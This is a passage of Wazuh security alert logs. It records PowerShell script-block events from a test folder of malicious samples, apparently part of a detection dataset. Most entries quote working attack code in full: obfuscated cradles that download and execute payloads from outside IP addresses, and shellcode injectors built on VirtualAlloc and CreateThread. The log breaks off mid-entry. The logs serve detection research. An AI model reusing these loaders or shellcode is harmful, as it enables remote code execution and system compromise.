[SysTEM.NET.CREdEnTiAlCAChE]::DeFauLtNeTwORKCrEDentialS;$K='acdbc174f599e7dbd03a21fa24b5dbf6';$I=0;[ChAr[]]$B=([chAr[]]($WC.DOWnlOaDSTrInG(\\\"http://78.229.133.134:80/index.asp\\\")))|%{$_-bXor$K[$i++%$K.LeNgTh]};IEX ($b-jOIN'')","scriptBlockId":"e5d99ba0-4f2f-4467-815c-0ab3ca5f6694","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3480.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:20.745+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":177,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304480.3812024","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:40.5330874Z","eventRecordID":"145669","processID":"2648","threadID":"848","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$M1a = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $M1a -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xcd,0xd9,0x74,0x24,0xf4,0xb8,0x31,0xcd,0xda,0x04,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x42,0x18,0x03,0x42,0x18,0x83,0xea,0xcd,0x2f,0x2f,0xf8,0xc5,0x32,0xd0,0x01,0x15,0x53,0x58,0xe4,0x24,0x53,0x3e,0x6c,0x16,0x63,0x34,0x20,0x9a,0x08,0x18,0xd1,0x29,0x7c,0xb5,0xd6,0x9a,0xcb,0xe3,0xd9,0x1b,0x67,0xd7,0x78,0x9f,0x7a,0x04,0x5b,0x9e,0xb4,0x59,0x9a,0xe7,0xa9,0x90,0xce,0xb0,0xa6,0x07,0xff,0xb5,0xf3,0x9b,0x74,0x85,0x12,0x9c,0x69,0x5d,0x14,0x8d,0x3f,0xd6,0x4f,0x0d,0xc1,0x3b,0xe4,0x04,0xd9,0x58,0xc1,0xdf,0x52,0xaa,0xbd,0xe1,0xb2,0xe3,0x3e,0x4d,0xfb,0xcc,0xcc,0x8f,0x3b,0xea,0x2e,0xfa,0x35,0x09,0xd2,0xfd,0x81,0x70,0x08,0x8b,0x11,0xd2,0xdb,0x2b,0xfe,0xe3,0x08,0xad,0x75,0xef,0xe5,0xb9,0xd2,0xf3,0xf8,0x6e,0x69,0x0f,0x70,0x91,0xbe,0x86,0xc2,0xb6,0x1a,0xc3,0x91,0xd7,0x3b,0xa9,0x74,0xe7,0x5c,0x12,0x28,0x4d,0x16,0xbe,0x3d,0xfc,0x75,0xd6,0xf2,0xcd,0x85,0x26,0x9d,0x46,0xf5,0x14,0x02,0xfd,0x91,0x14,0xcb,0xdb,0x66,0x5b,0xe6,0x9c,0xf9,0xa2,0x09,0xdd,0xd0,0x60,0x5d,0x8d,0x4a,0x41,0xde,0x46,0x8b,0x6e,0x0b,0xf2,0x8e,0xf8,0x9a,0x0e,0xa2,0xc9,0x8a,0x12,0xc4,0x38,0x17,0x9a,0x22,0x6a,0xf7,0xcc,0xfa,0xca,0xa7,0xac,0xaa,0xa2,0xad,0x22,0x94,0xd2,0xcd,0xe8,0xbd,0x78,0x22,0x45,0x95,0x14,0xdb,0xcc,0x6d,0x85,0x24,0xdb,0x0b,0x85,0xaf,0xe8,0xec,0x4b,0x58,0x84,0xfe,0x3b,0xa8,0xd3,0x5d,0xed,0xb7,0xc9,0xc8,0x11,0x22,0xf6,0x5a,0x46,0xda,0xf4,0xbb,0xa0,0x45,0x06,0xee,0xbb,0x4c,0x92,0x51,0xd3,0xb0,0x72,0x52,0x23,0xe7,0x18,0x52,0x4b,0x5f,0x79,0x01,0x6e,0xa0,0x54,0x35,0x23,0x35,0x57,0x6c,0x90,0x9e,0x3f,0x92,0xcf,0xe9,0x9f,0x6d,0x3a,0xe8,0xdc,0xbb,0x02,0x9e,0x0c,0x78;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$DGHq=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($DGHq.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$DGHq,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: ddc3d5ba-32a3-4991-aabe-af65e914758b\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3485.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$M1a = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $M1a -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xcd,0xd9,0x74,0x24,0xf4,0xb8,0x31,0xcd,0xda,0x04,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x42,0x18,0x03,0x42,0x18,0x83,0xea,0xcd,0x2f,0x2f,0xf8,0xc5,0x32,0xd0,0x01,0x15,0x53,0x58,0xe4,0x24,0x53,0x3e,0x6c,0x16,0x63,0x34,0x20,0x9a,0x08,0x18,0xd1,0x29,0x7c,0xb5,0xd6,0x9a,0xcb,0xe3,0xd9,0x1b,0x67,0xd7,0x78,0x9f,0x7a,0x04,0x5b,0x9e,0xb4,0x59,0x9a,0xe7,0xa9,0x90,0xce,0xb0,0xa6,0x07,0xff,0xb5,0xf3,0x9b,0x74,0x85,0x12,0x9c,0x69,0x5d,0x14,0x8d,0x3f,0xd6,0x4f,0x0d,0xc1,0x3b,0xe4,0x04,0xd9,0x58,0xc1,0xdf,0x52,0xaa,0xbd,0xe1,0xb2,0xe3,0x3e,0x4d,0xfb,0xcc,0xcc,0x8f,0x3b,0xea,0x2e,0xfa,0x35,0x09,0xd2,0xfd,0x81,0x70,0x08,0x8b,0x11,0xd2,0xdb,0x2b,0xfe,0xe3,0x08,0xad,0x75,0xef,0xe5,0xb9,0xd2,0xf3,0xf8,0x6e,0x69,0x0f,0x70,0x91,0xbe,0x86,0xc2,0xb6,0x1a,0xc3,0x91,0xd7,0x3b,0xa9,0x74,0xe7,0x5c,0x12,0x28,0x4d,0x16,0xbe,0x3d,0xfc,0x75,0xd6,0xf2,0xcd,0x85,0x26,0x9d,0x46,0xf5,0x14,0x02,0xfd,0x91,0x14,0xcb,0xdb,0x66,0x5b,0xe6,0x9c,0xf9,0xa2,0x09,0xdd,0xd0,0x60,0x5d,0x8d,0x4a,0x41,0xde,0x46,0x8b,0x6e,0x0b,0xf2,0x8e,0xf8,0x9a,0x0e,0xa2,0xc9,0x8a,0x12,0xc4,0x38,0x17,0x9a,0x22,0x6a,0xf7,0xcc,0xfa,0xca,0xa7,0xac,0xaa,0xa2,0xad,0x22,0x94,0xd2,0xcd,0xe8,0xbd,0x78,0x22,0x45,0x95,0x14,0xdb,0xcc,0x6d,0x85,0x24,0xdb,0x0b,0x85,0xaf,0xe8,0xec,0x4b,0x58,0x84,0xfe,0x3b,0xa8,0xd3,0x5d,0xed,0xb7,0xc9,0xc8,0x11,0x22,0xf6,0x5a,0x46,0xda,0xf4,0xbb,0xa0,0x45,0x06,0xee,0xbb,0x4c,0x92,0x51,0xd3,0xb0,0x72,0x52,0x23,0xe7,0x18,0x52,0x4b,0x5f,0x79,0x01,0x6e,0xa0,0x54,0x35,0x23,0x35,0x57,0x6c,0x90,0x9e,0x3f,0x92,0xcf,0xe9,0x9f,0x6d,0x3a,0xe8,0xdc,0xbb,0x02,0x9e,0x0c,0x78;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$DGHq=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($DGHq.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$DGHq,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"ddc3d5ba-32a3-4991-aabe-af65e914758b","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3485.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:20.856+0000","rule":{"level":4,"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","id":"91837","mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]},"firedtimes":18,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304480.3823383","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:41.3377279Z","eventRecordID":"145673","processID":"9088","threadID":"3556","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n[SYstem.NET.SErviCEPoIntMAnaGEr]::EXPecT100CoNtinuE = 0;$WC=NeW-OBJeCt SYsTEM.Net.WebClIeNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HeADErs.AdD('User-Agent',$u);$WC.PrOXY = [SYsteM.NET.WEBREqUESt]::DeFaULTWEbPROXy;$wC.ProXY.CredeNtIals = [SYStEM.NET.CrEdEnTialCacHE]::DEFAUlTNetWOrkCRedenTIAls;$K='63a9f0ea7bb98050796b649e85481845';$I=0;[cHaR[]]$B=([Char[]]($WC.DOWnlOadSTriNg(\"http://138.121.170.12:3031/index.asp\")))|%{$_-bXor$K[$i++%$K.LengTh]};IEX ($B-Join'')\r\n\r\nScriptBlock ID: d11845e9-1c6c-40da-b0f6-1cc92284f21c\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3504.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"[SYstem.NET.SErviCEPoIntMAnaGEr]::EXPecT100CoNtinuE = 0;$WC=NeW-OBJeCt SYsTEM.Net.WebClIeNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HeADErs.AdD('User-Agent',$u);$WC.PrOXY = [SYsteM.NET.WEBREqUESt]::DeFaULTWEbPROXy;$wC.ProXY.CredeNtIals = [SYStEM.NET.CrEdEnTialCacHE]::DEFAUlTNetWOrkCRedenTIAls;$K='63a9f0ea7bb98050796b649e85481845';$I=0;[cHaR[]]$B=([Char[]]($WC.DOWnlOadSTriNg(\\\"http://138.121.170.12:3031/index.asp\\\")))|%{$_-bXor$K[$i++%$K.LengTh]};IEX ($B-Join'')","scriptBlockId":"d11845e9-1c6c-40da-b0f6-1cc92284f21c","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3504.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:21.728+0000","rule":{"level":4,"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","id":"91837","mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]},"firedtimes":19,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304481.3827405","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:42.0573444Z","eventRecordID":"145677","processID":"2992","threadID":"8196","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$WC=NEW-ObjEcT SySTEM.NEt.WEBCLIent;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeaDERs.ADD('User-Agent',$u);$Wc.PrOxY = [SYStEm.NEt.WEbRequEST]::DeFAUltWEBPRoxy;$WC.PRoxy.CrEDENTIAls = [SYStem.Net.CRedenTialCaChe]::DeFaULtNEtWoRkCRedEnTIALS;$K='W?9nCa`u12hUg[5o_AJ^tG&!.k:lETBx';$I=0;[ChAR[]]$b=([ChaR[]]($wC.DoWNLOaDSTrinG(\"http://192.168.52.128:8080/index.asp\")))|%{$_-bXOr$K[$i++%$K.LenGTh]};IEX ($b-JoiN'')\r\n\r\nScriptBlock ID: f5249711-d406-47e3-8821-bf8b22c0e100\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3507.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$WC=NEW-ObjEcT SySTEM.NEt.WEBCLIent;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeaDERs.ADD('User-Agent',$u);$Wc.PrOxY = [SYStEm.NEt.WEbRequEST]::DeFAUltWEBPRoxy;$WC.PRoxy.CrEDENTIAls = [SYStem.Net.CRedenTialCaChe]::DeFaULtNEtWoRkCRedEnTIALS;$K='W?9nCa`u12hUg[5o_AJ^tG&amp;!.k:lETBx';$I=0;[ChAR[]]$b=([ChaR[]]($wC.DoWNLOaDSTrinG(\\\"http://192.168.52.128:8080/index.asp\\\")))|%{$_-bXOr$K[$i++%$K.LenGTh]};IEX ($b-JoiN'')","scriptBlockId":"f5249711-d406-47e3-8821-bf8b22c0e100","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3507.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:22.993+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":178,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304482.3831211","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:42.8709475Z","eventRecordID":"145681","processID":"7528","threadID":"1920","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x64,0x68,0x02,0x00,0x30,0x39,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: acd9c8a9-42c1-4b05-b798-e15304c17786\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3514.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x64,0x68,0x02,0x00,0x30,0x39,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"acd9c8a9-42c1-4b05-b798-e15304c17786","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3514.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:23.126+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":179,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304483.3842216","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:43.6395432Z","eventRecordID":"145685","processID":"6732","threadID":"8376","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$Teh = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Teh -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x4e,0xa7,0xbf,0x9d,0xd9,0xed,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x56,0x0f,0x03,0x56,0x41,0x45,0x4a,0x61,0xb5,0x0b,0xb5,0x9a,0x45,0x6c,0x3f,0x7f,0x74,0xac,0x5b,0x0b,0x26,0x1c,0x2f,0x59,0xca,0xd7,0x7d,0x4a,0x59,0x95,0xa9,0x7d,0xea,0x10,0x8c,0xb0,0xeb,0x09,0xec,0xd3,0x6f,0x50,0x21,0x34,0x4e,0x9b,0x34,0x35,0x97,0xc6,0xb5,0x67,0x40,0x8c,0x68,0x98,0xe5,0xd8,0xb0,0x13,0xb5,0xcd,0xb0,0xc0,0x0d,0xef,0x91,0x56,0x06,0xb6,0x31,0x58,0xcb,0xc2,0x7b,0x42,0x08,0xee,0x32,0xf9,0xfa,0x84,0xc4,0x2b,0x33,0x64,0x6a,0x12,0xfc,0x97,0x72,0x52,0x3a,0x48,0x01,0xaa,0x39,0xf5,0x12,0x69,0x40,0x21,0x96,0x6a,0xe2,0xa2,0x00,0x57,0x13,0x66,0xd6,0x1c,0x1f,0xc3,0x9c,0x7b,0x03,0xd2,0x71,0xf0,0x3f,0x5f,0x74,0xd7,0xb6,0x1b,0x53,0xf3,0x93,0xf8,0xfa,0xa2,0x79,0xae,0x03,0xb4,0x22,0x0f,0xa6,0xbe,0xce,0x44,0xdb,0x9c,0x86,0xa9,0xd6,0x1e,0x56,0xa6,0x61,0x6c,0x64,0x69,0xda,0xfa,0xc4,0xe2,0xc4,0xfd,0x2b,0xd9,0xb1,0x92,0xd2,0xe2,0xc1,0xbb,0x10,0xb6,0x91,0xd3,0xb1,0xb7,0x79,0x24,0x3e,0x62,0x17,0x21,0xa8,0x4d,0x40,0x28,0x43,0x26,0x93,0x2b,0x92,0x0a,0x1a,0xcd,0xc4,0x22,0x4d,0x42,0xa4,0x92,0x2d,0x32,0x4c,0xf9,0xa1,0x6d,0x6c,0x02,0x68,0x06,0x06,0xed,0xc5,0x7e,0xbe,0x94,0x4f,0xf4,0x5f,0x58,0x5a,0x70,0x5f,0xd2,0x69,0x84,0x11,0x13,0x07,0x96,0xc5,0xd3,0x52,0xc4,0x43,0xeb,0x48,0x63,0x6b,0x79,0x77,0x22,0x3c,0x15,0x75,0x13,0x0a,0xba,0x86,0x76,0x01,0x73,0x13,0x39,0x7d,0x7c,0xf3,0xb9,0x7d,0x2a,0x99,0xb9,0x15,0x8a,0xf9,0xe9,0x00,0xd5,0xd7,0x9d,0x99,0x40,0xd8,0xf7,0x4e,0xc2,0xb0,0xf5,0xa9,0x24,0x1f,0x05,0x9c,0xb4,0x63,0xd0,0xd8,0xc2,0x8d,0xe0;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$3uZS=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($3uZS.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$3uZS,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 425d89b2-44ad-4195-b2e5-321b038cbcc0\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3559.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$Teh = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Teh -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 